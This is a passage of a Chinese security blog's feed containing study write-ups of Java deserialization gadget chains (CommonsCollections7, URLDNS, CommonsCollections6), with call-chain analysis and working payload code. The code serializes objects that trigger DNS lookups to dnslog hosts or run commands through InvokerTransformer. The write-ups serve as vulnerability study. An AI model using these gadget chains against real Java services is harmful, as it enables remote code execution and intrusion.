href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89">http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89</a></p><h4 id="问题2">问题2</h4><p>为什么要反射修改ChainedTransformer的属性值</p><p>经过调试我们发现在hashtable对象进行put的时候也会调用到equals方法具体参照问题1的分析</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714751842043-cbf6e4df-fb01-4188-ba28-8094371979c3.png" alt=""></p><p>所以在序列化之前我们先传一个不能够执行命令的invokertransformer对象。</p><h4 id="问题3">问题3</h4><p>为什么要删除laymap2中的key值呢，其实这里我们可以参考cc6链中为什么在序列化之前移除key一样，因为lazyMap执行get方法需要保证不存在这个值<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755545755-24aa5aa4-28c7-4d7a-9249-ed093b81390d.png" alt=""></p><p>而我们通过参考<a href="https://www.anquanke.com/post/id/248169#h2-6">https://www.anquanke.com/post/id/248169#h2-6</a>文章和自己调试也发现我们在进行put的时候也会调用上面所分析的一系列方法导致最后put时最后调用get的时候我们会传入yy方法此时呢map对象是lazymap2其中是没有yy的值的但是</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755927376-4f63cbbb-0a50-40fb-8e30-2de226e52b77.png" alt=""></p><p>我们发现他会put进去，所以我们需要在序列化之前将其值删除掉，这样在反序列化的时候我们才能进入判断条件从而调用transform方法。</p><p>cc7调用链</p><p>直接贴原作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实该条利用链和cc5也是大同小异，也是利用LazyMap去触发的，只不过入口点换成了Hashtable&lt;/p&gt;
&lt;p&gt;我们先来直接看看网上的poc然后跟着分析分析&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS反序列化</title>
    <link href="https://oceanzbz.github.io/post/d6bbd4bc.html"/>
    <id>https://oceanzbz.github.io/post/d6bbd4bc.html</id>
    <published>2024-12-30T06:37:52.000Z</published>
    <updated>2025-03-05T07:24:36.796Z</updated>
    
    <content type="html"><![CDATA[<p>可以看一下这两篇分析java序列化和反序列化的执行流程。</p><p><a href="https://www.cnpanda.net/sec/893.html">https://www.cnpanda.net/sec/893.html</a></p><p><a href="https://www.cnpanda.net/sec/928.html">https://www.cnpanda.net/sec/928.html</a></p><p>搭建从新复习以前学过的java反序列化，尽量能够都跟一遍以前不够细致太过于浮躁，因此重新开启一个新的学习。</p><h2 id="1-环境搭建">1.环境搭建</h2><p>在进行反序列化调试时我们先<a href="https://github.com/frohoff/ysoserial">ysoserial</a>项目进行环境搭建，下面就搭建遇到的问题做一个记录。</p><p>首先直接下载压缩包然后将项目拖进idea，之后将pom.xm文件中的依赖jar全部下载。</p><h3 id="第一个问题">第一个问题</h3><p>就是依赖包有的加载不出来可能是因为我们配置的阿里云的镜像没有依赖的原因所以我们就手动将jar导入到本地maven仓库。这里参考<a href="https://blog.csdn.net/Ming_super/article/details/128728472">https://blog.csdn.net/Ming_super/article/details/128728472</a>进行导入</p><p>首先找到maven的官网然后找到自己所需要的依赖</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846520144-c8a0632e-a6d5-4cdd-9bc9-1751ec77ce83.png" alt=""></p><p>将红箭头所指的jar包下载下来。然后打开windows cmd  将jar包导入到本地仓库。</p><p>输入以下命令例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file</span><br><span class="line">        -Dfile=D:\mybatis-<span class="number">3.5</span><span class="number">.10</span>.jar</span><br><span class="line">        -DgroupId=org.mybatis</span><br><span class="line">        -DartifactId=mybatis </span><br><span class="line">        -Dversion=<span class="number">3.5</span><span class="number">.10</span> </span><br><span class="line">        -Dpackaging=jar</span><br></pre></td></tr></table></figure><p>之后就可以在pom.xml文件中正常加载了。</p><h3 id="第二个问题">第二个问题</h3><p>就是我们在运行ysoserial主程序一直报错找不到java程序包，但是通过排查发现明明已经导入进来了。</p><p>这里解决办法：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846707666-96b1ee34-0ec7-481f-b70a-d432a380655c.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846755542-a2acd9be-7a79-4fb2-97a2-71d75842c4b6.png" alt=""></p><p>打开idea项目中的Project Structure 将箭头所指的地方改成相对应的然后在setting中将本地的java环境与项目环境也设置城同样的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846810061-f2252040-e8c1-42ab-ad29-a2c1b44e0157.png" alt=""></p><p>之后就可以运行程序了。</p><p>在运行程序输入参数可以直接在项目中进行编辑</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846852331-f630cc9f-ddb0-404f-af84-0bbcc0adef30.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846884585-98d25eba-5449-40d9-8558-3836b9e20673.png" alt=""></p><p>这里以生成urldns链为例其它的可以自行百度。</p><h2 id="java反序列化的过程">java反序列化的过程</h2><p>参考：<a href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724413722961-dd6cbb05-5809-4b6a-9ae9-22f63f62cc7f.png" alt=""></p><h2 id="调用图：">调用图：</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724417545879-786e96dc-7106-451a-a127-11550f04b107.png" alt=""></p><h2 id="2-URLDNS链">2.URLDNS链</h2><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不</p><p>是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤：</p><p>使⽤Java内置的类构造，对第三⽅库没有依赖</p><p>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</p><p>ysoserial如何生成urldns链的过程可以参考：</p><p><a href="https://www.cnblogs.com/gk0d/p/16874157.html">https://www.cnblogs.com/gk0d/p/16874157.html</a></p><h3 id="调用过程：">调用过程：</h3><p>首先判段是否传入了两个参数，如果不是则打印帮助信息；是的话会依次分别赋值给payloadType和command变量。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224687545-3edda390-9a0c-45d9-8a0c-4c684dbbd91c.png" alt=""></p><p>之后实例化了一个需要继承ObjectPayload类的类实例化对象，跟进一下getPayloadClass方法，在ysoserial.payloads.ObjectPayload.Utils下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224728921-ed2aa8ef-b5cc-4370-8fbb-6a7e6f62a6a6.png" alt=""></p><p>在箭头所指的地方通过反射获取了 URLDNS的class对象，然后实例化获取URLDNS对象并调用 getobject方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224856548-2df67463-1926-4d9f-a13b-df89d995aa2e.png" alt=""></p><p>通过跟进getobject方法发现其返回了一个hashmap对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224908824-b3a13ef8-9953-4045-93f6-7e809ff94bd5.png" alt=""></p><p>然后序列化输出该对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224970963-b7bcbbb8-34e1-41c2-a6f3-ea5fb0ba0b0f.png" alt=""></p><p>以上就是ysoserial生成urldns的过程，下面着重分析以下为什么反序列化可以触发一次dns请求。上文已经说到了最后序列化的是hashmap对象所以我们可以直接看hashmap的readobject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\shentougongju\\ysoserial\\test.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> o.readObject();</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在hashmap的readobject中下一个断点进行调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226809705-1373e80c-42da-43cb-96bf-f6e194c1f1b9.png" alt=""></p><p>我们可以发现最终调用了一个putval方法，它里面对key进行了hash方法，而我们知道这个key是我们序列化进去的URL对象继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226956902-caa74e7f-b275-4ed1-9462-7a9fe21ae4a6.png" alt=""></p><p>发现对key做了一个判断，如果不为空的话就调用key对象的hashcode方法，而这里我们知道key是url对象，所以调用的是URL对象的hashcode方法继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227099512-fcb456ae-9394-47eb-af59-b2fc6a283f27.png" alt=""></p><p>这里判断hashcode是否等于-1如果不等于-1就返回hashcode如果等于-1就继续调用handler的hashcode方法，这里通过上文的getobject方法可以知道传入的handler是URLStreamHandler对象继续跟进去：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227369926-1b0616ed-65b5-447d-8f1e-85f1b6a3fce8.png" alt=""></p><p>可以看到第10行调用了getHostAddress方法跟进去看看：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227492916-5798e9bc-3026-41fd-82ce-2d24029e79c8.png" alt=""></p><p>继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227509620-598dd861-441a-4615-90fc-d14bf1509353.png" alt=""></p><p>发现调用getByname方法 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p><p>这里是ysoserial的payload总结一下调用链</p><ol><li>HashMap-&gt;readObject()</li><li>PutVal-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>下面我们来看一下网上常见的payload与ysoserial的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">       f.setAccessible(<span class="literal">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">       f.set(url,<span class="number">123</span>); <span class="comment">// 设置hashcode的值为-1的其他任何数字</span></span><br><span class="line">       System.out.println(url.hashCode());</span><br><span class="line">       map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line">       f.set(url,-<span class="number">1</span>); <span class="comment">// 将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line"></span><br><span class="line">           outputStream.writeObject(map);</span><br><span class="line">           outputStream.close();</span><br><span class="line">           fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">           inputStream.readObject();</span><br><span class="line">           inputStream.close();</span><br><span class="line">           fileInputStream.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们可以发现在进行put之前URL对象之前我们反射修改了其hashcode的值，这是为什么呢，是因为在序列化的时候writeobject 会写入key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buckets</span> <span class="operator">=</span> capacity();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeInt(buckets);</span><br><span class="line">        s.writeInt(size);</span><br><span class="line">        internalWriteEntries(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab;</span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">              <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                  s.writeObject(e.key);</span><br><span class="line">                  s.writeObject(e.value);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNStest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://razgbd.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时会产生dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以要想不在put的时候发起dns请求需要反射修改其hashcode的值让其不为-1即可因为不为-1会直接返回hashcode的值不会进行后续的调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714232350597-a9d56e20-f65f-424e-98f4-2d6a0a232f99.png" alt=""></p><p>那ysoserial在put时是怎么不触发dns请求的呢调试一下：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235280291-9d23edfb-4a62-48ec-b317-73c2783170c9.png" alt=""></p><p>在调用到箭头所指向的方法时其返回一个null值，从而不触发dns请求<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235322122-f98710a8-b5f4-4c17-bb18-8335d5bc7b9e.png" alt=""></p><p>那为什么反序列化时又能够发起请求了呢是因为URL类中handler被设置为 transient（当一个字段被声明为 transient 时，表示该字段不会参与对象的序列化过程，即在将对象转换为字节流以便进行存储或传输时，这些字段的值不会被包含在序列化的结果中。）<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235649137-224edc64-5083-4337-839c-86b8ceaf2395.png" alt=""></p><p>所以反序列化可以触发dns请求</p><p>参考：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631738506-bbe121c1-93dc-46af-bbf1-f404742d8cf6.pdf">Java安全漫谈 - 09.反序列化篇(3).pdf</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以看一下这两篇分析java序列化和反序列化的执行流程。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/893.html&quot;&gt;https://www.cnpanda.net/sec/893.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a hre</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="URLDNS" scheme="https://oceanzbz.github.io/tags/URLDNS/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections6反序列化</title>
    <link href="https://oceanzbz.github.io/post/4643e9f2.html"/>
    <id>https://oceanzbz.github.io/post/4643e9f2.html</id>
    <published>2024-12-30T06:36:35.000Z</published>
    <updated>2025-03-05T07:24:36.788Z</updated>
    
    <content type="html"><![CDATA[<p>在ysoserial中，CommonsCollections6可以说是commons-collections这个库中相对⽐较通⽤的利⽤ 链，为了解决⾼版本Java的利⽤问题，我们先来看看这个利⽤链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="comment">//定义序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(key,<span 